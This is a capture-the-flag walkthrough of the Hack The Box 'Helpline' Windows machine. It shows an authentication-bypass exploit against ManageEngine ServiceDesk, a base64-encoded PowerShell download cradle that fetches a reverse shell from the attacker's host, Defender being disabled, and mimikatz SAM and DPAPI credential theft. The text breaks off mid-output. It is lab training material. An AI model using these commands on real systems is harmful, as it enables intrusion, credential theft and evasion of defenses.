@@ -1,0 +1,867 @@
+Helpline - Hack The Box
+
+Windows box - Multiple Ways of getting into the box
+
+We see multiple open windows ports, we can use smbmap to see if there are any shares available
+Commands and OUTPUT:
+===============================================================================================================================
+smbmap -H 10.10.10.132
+smbmap -H 10.10.10.132 -u anonymous
+[!] Authentication error on 10.10.10.132
+===============================================================================================================================
+
+If we find any cred we will try it again.
+We will now go to: http://10.10.10.132:8080/
+
+We get ManageEngine Service Desk Plus Copyright © 2021 ZOHO Corporation. All rights reserved.
+Help Desk Software by ManageEngine ServiceDesk Plus  |  9.3
+
+
+We can use searcshploit to find any exploits:
+Commands and OUTPUT:
+===============================================================================================================================
+└──╼ $searchsploit Manage Engine Service Desk
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                          |  Path
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Manage Engine ServiceDesk Plus 10.0 - Privilege Escalation                                              | jsp/webapps/46659.py
+ManageEngine Service Desk 10.0 - Cross-Site Scripting                                                   | java/webapps/48473.txt
+ManageEngine ServiceDesk 8.0 - Multiple Vulnerabilities                                                 | windows/webapps/22879.txt
+ManageEngine ServiceDesk 8.0.0.12 - Database Disclosure                                                 | jsp/webapps/17503.pl
+ManageEngine ServiceDesk Plus 7.6 - woID SQL Injection                                                  | jsp/webapps/11793.txt
+ManageEngine ServiceDesk Plus 8.0 - Directory Traversal                                                 | jsp/webapps/17437.txt
+ManageEngine ServiceDesk Plus 8.0 - Multiple Persistent Cross-Site Scripting Vulnerabilities            | jsp/webapps/17713.txt
+ManageEngine ServiceDesk Plus 8.0 Build 8013 - Multiple Cross-Site Scripting Vulnerabilities            | jsp/webapps/17586.txt
+ManageEngine ServiceDesk Plus 8.0.0 Build 8013 - Improper User Privileges                               | multiple/webapps/17572.txt
+ManageEngine ServiceDesk Plus 8.1 - Persistent Cross-Site Scripting                                     | windows/webapps/20356.py
+ManageEngine ServiceDesk Plus 9.0 - Authentication Bypass                                               | java/webapps/42037.txt
+ManageEngine ServiceDesk Plus 9.0 - SQL Injection                                                       | jsp/webapps/35890.txt
+ManageEngine ServiceDesk Plus 9.0 - User Enumeration                                                    | jsp/webapps/35891.txt
+ManageEngine ServiceDesk Plus 9.0 < Build 9031 - User Privileges Management                             | jsp/webapps/35904.txt
+ManageEngine ServiceDesk Plus 9.1 build 9110 - Directory Traversal                                      | jsp/webapps/38395.txt
+ManageEngine ServiceDesk Plus 9.2 Build 9207 - Unauthorized Information Disclosure                      | java/webapps/40569.txt
+ManageEngine ServiceDesk Plus 9.3 - User Enumeration                                                    | java/webapps/46674.txt
+Zoho ManageEngine ServiceDesk Plus (SDP) < 10.0 build 10012 - Arbitrary File Upload                     | jsp/webapps/46413.txt
+Zoho ManageEngine ServiceDesk Plus 9.3 - 'PurchaseRequest.do' Cross-Site Scripting                      | java/webapps/46966.txt
+Zoho ManageEngine ServiceDesk Plus 9.3 - 'SearchN.do' Cross-Site Scripting                              | java/webapps/46965.txt
+Zoho ManageEngine ServiceDesk Plus 9.3 - 'SiteLookup.do' Cross-Site Scripting                           | java/webapps/46963.txt
+Zoho ManageEngine ServiceDesk Plus 9.3 - 'SolutionSearch.do' Cross-Site Scripting                       | java/webapps/46964.txt
+Zoho ManageEngine ServiceDesk Plus 9.3 - Cross-Site Scripting                                           | multiple/webapps/46895.txt
+Zoho ManageEngine ServiceDesk Plus < 10.5 - Improper Access Restrictions                                | multiple/webapps/46894.txt
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+===============================================================================================================================
+
+We look and only care about the 9.3 User enumeration.
+We set up burpsuite to enumerate the login portal and are initially redirected to the following:
+http://10.10.10.132:8080/domainServlet/AJaxDomainServlet?action=searchLocalAuthDomain&timestamp=Wed%20Apr%2007%202021%2020:29:09%20GMT+0000%20(Coordinated%20Universal%20Time)&search=admin
+
+We send the page that was interecepted in our history to repeater and further see that when we send the request we get a "null" response 
+from the server and if we specify another user say "administrator" we get a "Not in Domain" response.
+
+We can potentially use this to enumerate users from the website. We will use wfuzz
+
+Commands and OUTPUT:
+===============================================================================================================================
+└──╼ $wfuzz -w /opt/SecLists/Usernames/top-usernames-shortlist.txt -u 'http://10.10.10.132:8080/domainServlet/AJaxDomainServlet?action=searchLocalAuthDomain&timestamp=Wed%20Apr%2007%202021%2020:29:09%20GMT+0000%20(Coordinated%20Universal%20Time)&search=FUZZ'
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.132:8080/domainServlet/AJaxDomainServlet?action=searchLocalAuthDomain&timestamp=Wed%20Apr%2007%202021%2020:29:09%20GMT+0000%20(Coordinated%20Universal%20Time)&search=FUZZ
+Total requests: 17
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                  
+=====================================================================
+
+000000015:   200        0 L      1 W        4 Ch        "ec2-user"                                                               
+000000001:   200        0 L      1 W        4 Ch        "root"                                                                   
+000000003:   200        0 L      1 W        4 Ch        "test"                                                                   
+000000014:   200        0 L      1 W        4 Ch        "ansible"                                                                
+000000013:   200        0 L      1 W        4 Ch        "puppet"                                                                 
+000000017:   200        0 L      1 W        4 Ch        "azureuser"                                                              
+000000007:   200        0 L      1 W        4 Ch        "mysql"                                                                  
+000000016:   200        0 L      1 W        4 Ch        "vagrant"                                                                
+000000012:   200        0 L      1 W        4 Ch        "pi"                                                                     
+000000006:   200        0 L      1 W        4 Ch        "adm"                                                                    
+000000011:   200        0 L      1 W        4 Ch        "ftp"                                                                    
+000000009:   200        0 L      3 W        13 Ch       "administrator"                                                          
+000000010:   200        0 L      1 W        4 Ch        "oracle"                                                                 
+000000008:   200        0 L      1 W        4 Ch        "user"                                                                   
+000000002:   200        0 L      1 W        4 Ch        "admin"                                                                  
+000000004:   200        0 L      3 W        13 Ch       "guest"                                                                  
+000000005:   200        0 L      1 W        4 Ch        "info"                                                                   
+
+Total time: 0.389099
+Processed Requests: 17
+Filtered Requests: 0
+Requests/sec.: 43.69066
+
+===============================================================================================================================
+
+Right off the bat we see that there are 2 users with different characters, those being "guest" and "administrator".
+We also searched online and noticed that the default creds where "administrator:administrator" however those did not work, so we will
+try guest and see where that leads. We try "guest:guest" and we get in.
+
+Next thing to do since we are authenticated is look at hte previous searchsploit privilige escalation and look at the cve.
+We copy it and will now test it.
+Commands and OUTPUT:
+===============================================================================================================================
+searchsploit -m jsp/webapps/46659.py
+┌─[user@parrot-virtual]─[~/htb/helpline]
+└──╼ $grep -i cve 46659.py 
+# CVE: CVE-2019-10008
+# 24 march 2019: CVE id reserved for CVE-2019-10008
+
+===============================================================================================================================
+
+We also take a look at the cve. We find a github page but can't seem to find more details on how the exploit works so google cache a 404
+webpage. That does not work so instead we can look through it via the wayback machine.
+https://web.archive.org/web/20190714061023/https://flameofignis.com/en/vuln/CVE-2019-10008
+
+The following are the steps taken to get higher privileges
+Commands and OUTPUT:
+===============================================================================================================================
+1) Get request to homepage with no session cookies. It will send Set-Cookie JSESSION[0].
+
+2) Post request to login page with JSESSION[0]. It will redirect to homepage.
+
+3) Get request to homepage with JSESSION[0]. It will send Set-Cookie JSESSION[1] and JSESSIONSSO[0].
+
+4) Get request to mc with JSESSIONID[1] and JSESSIONIDSSO[0]. It will send back JSESSIONID[2].
+
+5) Get request to mc logout with JSESSIONID[2], JSESSIONID[1] and JSESSIONIDSSO[0]. This will logout the mobile session, but not the authenticated jsession cookie.
+
+6) Get request to mc dashboard page with same cookies. This will send back Set-Cookies for JSESSIONID[3] and JSESSIONIDSSO[0]. At this point, our mobile session JSESSION[2] is logged out and replaced with JSESSION[3]-JSESSIONSSO[0], but our JSESSION[1]-JSESSIONSSO[0] is still authenticated with the first credentials.
+
+7) Get request to homepage again to be assigned JSESSIONID[4]-JSESSIONIDSSO[0] pair.
+
+8) Post request to mc login page with JSESSIONID[4], JSESSIONID[3] and JSESSIONIDSSO[0]. This will log JSESSIONID[4]-JSESSIONIDSSO[0] pair in no matter the username or password, and redirect to eventually return JSESSIONID[5]-JSESSIONIDSSO[1] pair. This pair can be used to log in as the second user.
+===============================================================================================================================
+
+
+We will use the python exploit script in conjunction with burpsuite to further analyze. Since the script is using curl we will modify 
+the curl.rc file in our directory to point to the burp proxy.
+
+Commands and OUTPUT:
+===============================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~]
+└──╼ $cat .curlrc 
+proxy=http://127.0.0.1:8080
+===============================================================================================================================
+
+Now if we do curl it will immediately  send it to our proxy. For the exploit lets not forget to change the localhost to the victim ip
+address. One quick thing on burp is to verify that server response option is on.
+
+We intercept the first jsession id which is the following:
+0.) Set-Cookie: JSESSIONID=AF9A3A767B0761858617B962919A68B7 Initial/Request
+
+We then get a post secuirty check:
+POST /j_security_check HTTP/1.1
+With the same jessionid and users/password: 
+Cookie: JSESSIONID=AF9A3A767B0761858617B962919A68B7
+j_username=guest&j_password=guest
+
+Another request is sent to the server since it does not send anything back. It should now respond with a jessession single sign on cookie
+HTTP/1.1 302 Moved Temporarily
+Cache-Control: private
+Expires: Thu, 01 Jan 1970 01:00:00 GMT
+Set-Cookie: JSESSIONID=0C25B2DB8C21839E7B40AA1916DB5343; Path=/; HttpOnly
+Set-Cookie: JSESSIONIDSSO=44AD087351D8D4B05B0CB98DA3835901; Path=/; HttpOnly
+1.) JSESSIONID=0C25B2DB8C21839E7B40AA1916DB5343   Authenticated to guest.
+
+Now we will be doing a get request to their mobile console denoted by "/mc/"
+AND we get another jsession cookie  
+2.) Set-Cookie: JSESSIONID=39FFD79F0585D5DBEFC31F872B088B95; Path=/mc/; HttpOnly   Guest to /mc/ and accoriding docs is jsession 2
+
+In the next step we are sending jsession 1 and 2. Authenticated guest and Guest to /mc/
+
+We click forward a cople of steps and we get another jessesion /mc/ after logout:
+3.) Set-Cookie: JSESSIONID=602F8FDA3B5F3AFCC37146A76E176881; Path=/mc/; HttpOnly    /MC/ after logout.
+
+We the send another jsession ids 1 and 3 and we get another jsession id from the server:
+4.)Set-Cookie: JSESSIONID=C9A87FE8E1A08377C53F0E5012A72E01; Path=/; HttpOnly  from /
+
+We then are making a post request with previously saved jsession ids with administrator and a random password.
+Commands and OUTPUT:
+===============================================================================================================================
+POST /mc/j_security_check HTTP/1.1
+Host: 10.10.10.132:8080
+User-Agent: curl/7.74.0
+Accept: */*
+10.10.10.132:8080
+Referer: http://10.10.10.132:8080/mc/jsp/MCDashboard.jsp
+Cookie: JSESSIONID=602F8FDA3B5F3AFCC37146A76E176881; JSESSIONID=C9A87FE8E1A08377C53F0E5012A72E01; _rem=true;febbc30d=99faca4aa8ee4b2eb05692c5e87f122f; mesdp64918c8143=0173826c65e0f92c5286cecf72a51c77f78673e5
+Content-Length: 62
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+j_username=administrator&j_password=byppass&DOMAIN_NAME=
+===============================================================================================================================
+
+We then finally get the last jsessionid:
+Cookie: JSESSIONID=602F8FDA3B5F3AFCC37146A76E176881; JSESSIONID=C9A87FE8E1A08377C53F0E5012A72E01; _rem=true;febbc30d=99faca4aa8ee4b2eb05692c5e87f122f; mesdp64918c8143=0173826c65e0f92c5286cecf72a51c77f78673e5
+5.) JSESSIONID=602F8FDA3B5F3AFCC37146A76E176881 
+
+AND We get the final web response which now has the authenticated cookies needed to get into the server as administrator
+Commands and OUTPUT:
+===============================================================================================================================
+HTTP/1.1 200 OK
+Cache-Control: private
+Expires: Thu, 01 Jan 1970 01:00:00 GMT
+Set-Cookie: JSESSIONID=0965660B184ABB280A1AA0ED551C8CD1; Path=/mc/; HttpOnly
+Set-Cookie: JSESSIONIDSSO=66379648AA486629C9B95F93C1B5C817; Path=/; HttpOnly
+===============================================================================================================================
+
+All we need to do now is replace our cookies. On firefox go to tools for web developers then storage and modify the cookies in there.
+"/custom" path cookie does not need to be modified. That shoudl authenticate as administrator.
+
+Now there should be plenty of ways to get code execution.
+1. hit admin tab, custom triggers
+2.) add a new action, we can run commands.
+
+We will test the trigger with ping. enter the necessary details, go
+to requests and start a new incident ticket. We save the request and it immediately creates the ping response.
+
+
+Commands and OUTPUT:
+===============================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/helpline]
+└──╼ $sudo !!
+sudo tcpdump -i tun0 icmp
+[sudo] password for user: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+14:45:51.012240 IP 10.10.10.132 > 10.10.14.23: ICMP echo request, id 1, seq 1, length 40
+14:45:51.012261 IP 10.10.14.23 > 10.10.10.132: ICMP echo reply, id 1, seq 1, length 40
+14:45:52.023900 IP 10.10.10.132 > 10.10.14.23: ICMP echo request, id 1, seq 2, length 40
+14:45:52.023912 IP 10.10.14.23 > 10.10.10.132: ICMP echo reply, id 1, seq 2, length 40
+14:45:53.033932 IP 10.10.10.132 > 10.10.14.23: ICMP echo request, id 1, seq 3, length 40
+14:45:53.033972 IP 10.10.14.23 > 10.10.10.132: ICMP echo reply, id 1, seq 3, length 40
+14:45:54.047196 IP 10.10.10.132 > 10.10.14.23: ICMP echo request, id 1, seq 4, length 40
+14:45:54.047230 IP 10.10.14.23 > 10.10.10.132: ICMP echo reply, id 1, seq 4, length 40
+
+===============================================================================================================================
+
+We now will create a reverse shell one liner to execute. We will use a nishang powershell one liner to have it execute on the server.
+Commands and OUTPUT:
+===============================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/helpline]
+└──╼ $cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
+mv Invoke-PowerShellTcp.ps1 shell.ps1 
+===============================================================================================================================
+
+We modify the ip address inside the script and will encode it to have it run without issues on the server.
+Commands and OUTPUT:
+===============================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/helpline]
+└──╼ $echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.23/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0 
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMwAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQAKAA==
+
+
+shell	  Created  Any Time [Next action execution is turned off]
+Criteria
+Status is (Open)
+Action Executor
+cmd /c powershell -nop -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMwAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQAKAA==
+===============================================================================================================================
+
+We then create a new requests for a new incident and it will automatically trigger the actions set, we set out netcat listerner
+
+Commands and OUTPUT:
+===============================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/helpline]
+└──╼ $nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.132] 49787
+Windows PowerShell running as user HELPLINE$ on HELPLINE
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS E:\ManageEngine\ServiceDesk\integration\custom_scripts>whoami
+nt authority\system
+
+===============================================================================================================================
+
+However we can not cat the user.txt or root.tx since the files are encrypted by the users themselvest
+
+Commands and OUTPUT:
+===============================================================================================================================
+PS C:\users\administrator\Desktop>+$
+gci root.txt$
+$
+$
+    Directory: C:\users\administrator\Desktop$
+$
+$
+Mode                LastWriteTime         Length Name++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++$
+----                -------------         ------ ----++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++$
+-ar---       12/20/2018  11:09 PM             32 root.txt++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++$
+$
+$
+gci root.txt | select length$
+$
+Length$
+------$
+    32
+PS C:\Users\Administrator\Desktop> cat root.txt
+PS C:\Users\Administrator\Desktop> cat : Access to the path 'C:\Users\Administrator\Desktop\root.txt' is denied.
+At line:1 char:1
++ cat root.txt
++ ~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop\root.txt:String) [Get-Content], Unauth 
+   orizedAccessException
+    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+ 
+===============================================================================================================================
+
+We must find a way to impersonate the users in order to get access to the files. We also try to find the user.txt
+
+Commands and OUTPUT:
+===============================================================================================================================
+cipher /c root.txt
+
+ Listing C:\users\administrator\Desktop\
+ New files added to this directory will not be encrypted.
+
+E root.txt
+  Compatibility Level:
+    Windows XP/Server 2003
+
+  Users who can decrypt:
+    HELPLINE\Administrator [Administrator(Administrator@HELPLINE)]
+    Certificate thumbprint: FB15 4575 993A 250F E826 DBAC 79EF 26C2 11CB 77B3 
+
+  No recovery certificate found.
+
+  Key information cannot be retrieved.
+
+===============================================================================================================================
+
+As you can see only the Administrator user can decrypt the file. We also try the same for the user.txt we can find it with the following:
+Commands and OUTPUT:
+===============================================================================================================================
+cd c:\users
+gci -recurse . | select fullname | findstr user.txt
+C:\users\tolu\Desktop\user.txt            
+
+===============================================================================================================================
+
+We do the same cipher
+Commands and OUTPUT:
+===============================================================================================================================
+cipher /c C:\users\tolu\Desktop\user.txt            
+ Listing C:\users\tolu\Desktop\
+ New files added to this directory will not be encrypted.
+
+E user.txt
+  Compatibility Level:
+    Windows XP/Server 2003
+
+  Users who can decrypt:
+    HELPLINE\tolu [tolu(tolu@HELPLINE)]
+    Certificate thumbprint: 91EF 5D08 D1F7 C60A A0E4 CEE7 3E05 0639 A669 2F29 
+
+  No recovery certificate found.
+
+  Key information cannot be retrieved.
+===============================================================================================================================
+
+The next thing to do is employ mimikatz to try and get ntlm hashes, actually cannot use ntlm hashes since it is not domain joined.
+On domain joined it should be possible. Can only use the shasum or only the clear text password. Msft does not want to place password
+in sam database. We are kind of stuck since we need the plain text passwords.
+And built certifcates for each user to view the files.
+
+Commands and OUTPUT:
+===============================================================================================================================
+IWR -uri http://10.10.14.23/mimikatz.exe -outfile mimikatz.exe
+===============================================================================================================================
+
+Word of note defender seems to delete mimikatz of the machine so diabling may be the best course of action to run without isssues.
+
+Commands and OUTPUT:
+===============================================================================================================================
+Set-Mppreference -DisableRealtimeMonitoring $true
+.\mimikatz.exe exit
+.\mimikatz.exe "token::elevate" "lsadump::sam" "exit"
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+520	{0;000003e7} 1 D 43557     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
+ -> Impersonated !
+
+===============================================================================================================================
+
+We were able to crack one of the hashes for the following hash in crackstation:
+eef285f4c800bcd1ae1e84c371eeb282	NTLM	0987654321
+
+Commands and OUTPUT:
+===============================================================================================================================
+The user being 
+┌─[user@parrot-virtual]─[~/htb/helpline]
+└──╼ $grep -a2 -b2 eef285f4c800bcd1ae1e84c371eeb282 ntlm-out.txt 
+3646-RID  : 000003ef (1007)
+3669-User : zachary
+3684:  Hash NTLM: eef285f4c800bcd1ae1e84c371eeb282
+===============================================================================================================================
+
+Next thing to do is try and ascertain what the zachary user can do on the box.
+Commands and OUTPUT:
+===============================================================================================================================
+net user zachary
+User name                    zachary
+Full Name                    zachary
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            12/21/2018 10:25:34 PM
+Password expires             Never
+Password changeable          12/21/2018 10:25:34 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   12/28/2018 10:57:32 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Event Log Readers    *Users                
+Global Group memberships     *None                 
+The command completed successfully.
+===============================================================================================================================
+
+Zachary is a member of the Event Log Readers group, best way to is to search for rambling cookie monster who has script that help sift 
+through this type of data.
+
+https://github.com/RamblingCookieMonster/PowerShell
+
+We want the Get-WinEventData powershell script 
+
+Commands and OUTPUT:
+===============================================================================================================================
+wget https://raw.githubusercontent.com/RamblingCookieMonster/PowerShell/master/Get-WinEventData.ps1
+sudo python3 -m http.server
+IWR -uri http://10.10.14.23/event.ps1 -outfile event.ps1
+. .\event.ps1
+===============================================================================================================================
+
+The "." was used to source the files that were downloaded and place them into memory.
+We are using the 4688 since it is cmdline process logging security event id for a new process being created.
+
+Commands and OUTPUT:
+===============================================================================================================================
+Get-WinEvent -FilterHashTable @{Logname='security';id=4688} 
+Get-WinEvent -FilterHashTable @{Logname='security';id=4688} | Get-WinEventData
+===============================================================================================================================
+
+Commands and OUTPUT:
+===============================================================================================================================
+Get-WinEvent -FilterHashTable @{Logname='security';id=4688} -MaxEvents 1 | Get-WinEventData | fl *
+===============================================================================================================================
+
+What we want out of the logs is to get the commands that were logged when users were typing stuff into the terminals, so what we 
+are doing with this script is sifting through all those logs to get the raw output of those inputs.
+
+Commands and OUTPUT:
+===============================================================================================================================
+Get-WinEvent -FilterHashTable @{Logname='security';id=4688} | Get-WinEventData | Select TimeCreated, e_CommandLine | ft -autosize
+===============================================================================================================================
+
+We quickly come to find a net dot exe with username and password.
+Commands and OUTPUT:
+===============================================================================================================================
+12/28/2018 10:40:28 PM "C:\Windows\system32\systeminfo.exe" /S \\helpline /U /USER:tolu /P !zaq1234567890pl!99
+===============================================================================================================================
+
+We can quickly validate the password with smbmap
+Commands and OUTPUT:
+===============================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/helpline]
+└──╼ $smbmap -u tolu -p '!zaq1234567890pl!99' -H 10.10.10.132
+[+] IP: 10.10.10.132:445	Name: 10.10.10.132                                      
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	E$                                                	NO ACCESS	Default share
+	Helpdesk_Stats                                    	READ ONLY	
+	IPC$                                              	READ ONLY	Remote IPC
+
+===============================================================================================================================
+
+We can indeed read shares from it now. With this password we can now use mimikatz to decrypt the efs (encrypted file system)
+Search for mimkatz decrypt efs
+https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
+
+Commands and OUTPUT:
+===============================================================================================================================
+cipher /c "c:\Users\tolu\Desktop\user.txt"
+ Listing c:\Users\tolu\Desktop\
+ New files added to this directory will not be encrypted.
+
+E user.txt
+  Compatibility Level:
+    Windows XP/Server 2003
+
+  Users who can decrypt:
+    HELPLINE\tolu [tolu(tolu@HELPLINE)]
+    Certificate thumbprint: 91EF 5D08 D1F7 C60A A0E4 CEE7 3E05 0639 A669 2F29 
+
+  No recovery certificate found.
+
+  Key information cannot be retrieved.
+
+===============================================================================================================================
+
+We need the certificate thumbprint: 91EF 5D08 D1F7 C60A A0E4 CEE7 3E05 0639 A669 2F29+
+
+Commands and OUTPUT:
+===============================================================================================================================
+C:\users\tolu\Appdata\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29
+.\mimikatz.exe "crypto::system /file:C:\users\tolu\Appdata\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29 /export" "exit"
+* File: 'C:\users\tolu\Appdata\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29'
+[0045/1] BACKED_UP_PROP_ID
+  00
+[0002/1] KEY_PROV_INFO_PROP_ID
+  Provider info:
+	Key Container  : e65e6804-f9cd-4a35-b3c9-c3a72a162e4d
+	Provider       : Microsoft Enhanced Cryptographic Provider v1.0
+	Provider type  : RSA_FULL (1)
+	Type           : AT_KEYEXCHANGE (0x00000001)
+	Flags          : 00000000
+	Param (todo)   : 00000000 / 00000000
+
+[0003/1] SHA1_HASH_PROP_ID
+  91ef5d08d1f7c60aa0e4cee73e050639a6692f29
+[0020/1] cert_file_element
+  Data: 308202f9308201e1a0030201020210560e4d2b13840a9f4ef8246c32c1950f300d06092a864886f70d0101050500300f310d300b06035504031304746f6c753020170d3138313232393231323133335a180f32313138313230353231323133335a300f310d300b06035504031304746f6c7530820122300d06092a864886f70d01010105000382010f003082010a0282010100b661bbc3191aed3031d754ceee0cef50462a746656b973a74bed822fa31d44b8eb9ce1f165ef9f9691863b18694d0d72ddbb4ed40bc91021ef9ec7dc977242dbab9d9124e548d7f71bfa191de5d0fd1d23de24a10958c5821adb7b89b350e5c3da17cdffdf828659dd8732f55bc7bd4f7e7c167f3f054520c34a4b280dbe0e86faae45082eeed8422549a49134b398351563c62dab70cfa3bb66d9cf07e749f3c2bc9a554a8b2bcda9559d3f42b7b1fed755c519f26243756363efd93cae3f71aa813af0757d231a43daae5b3dc4303b330833e2db7cad6af45ab9c2b756c2de5af4f250df1c58e35bdfb3ccbc6c3be0db973faf27314413375d7b1c40dbc3310203010001a34f304d30150603551d25040e300c060a2b0601040182370a030430290603551d1104223020a01e060a2b060104018237140203a0100c0e746f6c754048454c504c494e450030090603551d1304023000300d06092a864886f70d010105050003820101001054e49d105efb13f699ec26dd8f2828eff46966b8b3623dafb132b287e4a4c870261bb6bec2acf8a8a648aead2b8c9daeb366d6096889ea23cba08d71b78aa9c09e92218c6bbd5b17e67910c551f0f452963d730f5b90c6be10048c1234087bcd1cdcc0f17adae55452f7f0b495414f54de59ff39f513e81aae5c1aa6e54beb8561aa5795cb59dddbfe528b9020d1f4d1aab1842eafbc0c0d92c75aa42ab1dd278262676a2fd5a39b526544d37cf59c2647db5efb743c78fb744be0cf41b2512c7f42dbb2949cbe359aca36b17670247b49b12c27119f7d358ca38e70c3ccebd13c5bccc7236ae09646af07077233b49a5615cb8be05b642e09de595c89dfb9
+  Saved to file: 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der
+
+===============================================================================================================================
+
+Once we have the file we can now transfer it over with smb if need be so we make an smbserver using impacket
+
+Commands and Output:
+===============================================================================================================================
+~/impacket-venv/bin/smbserver.py  -smb2support -user test -pass test test $(pwd)
+### Useful fr netcat transfer on powershell
+cmd /c 'nc.exe 10.10.14.23 5555 < filetotransfer.txt'
+===============================================================================================================================
+
+Commands and Output:
+===============================================================================================================================
+net use z: \\10.10.14.23\test /user:test test 
+The command completed successfully.
+copy 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der z:
+===============================================================================================================================
+
+We now need the masterkey, this can be found in the following directory
+C:\users\tolu\Appdata\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011
+
+Commands and Output:
+===============================================================================================================================
+gci -hidden
+
+
+    Directory: C:\users\tolu\Appdata\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a-hs-       12/28/2018   9:56 PM            468 2f452fc5-c6d2-4706-a4f7-1cd6b891c017                                  
+-a-hs-       12/28/2018   9:56 PM             24 Preferred                                                             
+
+===============================================================================================================================
+
+
+Commands and Output:
+===============================================================================================================================
+"dpapi::masterkey /in:C:\users\tolu\Appdata\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011\2f452fc5-c6d2-4706-a4f7-1cd6b891c017 /password:!zaq1234567890pl!99" "exit"
+=============================================================================================================================== 
+
+Commands and Output:
+===============================================================================================================================
+                    ./mimikatz.exe "dpapi::masterkey /in:C:\users\tolu\Appdata\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011\2f452fc5-c6d2-4706-a4f7-1cd6b891c017 /password:!zaq1234567890pl!99" "exit"
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # dpapi::masterkey /in:C:\users\tolu\Appdata\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011\2f452fc5-c6d2-4706-a4f7-1cd6b891c017 /password:!zaq1234567890pl!99
+**MASTERKEYS**
+  dwVersion          : 00000002 - 2
+  szGuid             : {2f452fc5-c6d2-4706-a4f7-1cd6b891c017}
+  dwFlags            : 00000005 - 5
+  dwMasterKeyLen     : 000000b0 - 176
+  dwBackupKeyLen     : 00000090 - 144
+  dwCredHistLen      : 00000014 - 20
+  dwDomainKeyLen     : 00000000 - 0
+[masterkey]
+  **MASTERKEY**
+    dwVersion        : 00000002 - 2
+    salt             : 80ba00dd649b0237d847b3c30d155a36
+    rounds           : 00001f40 - 8000
+    algHash          : 0000800e - 32782 (CALG_SHA_512)
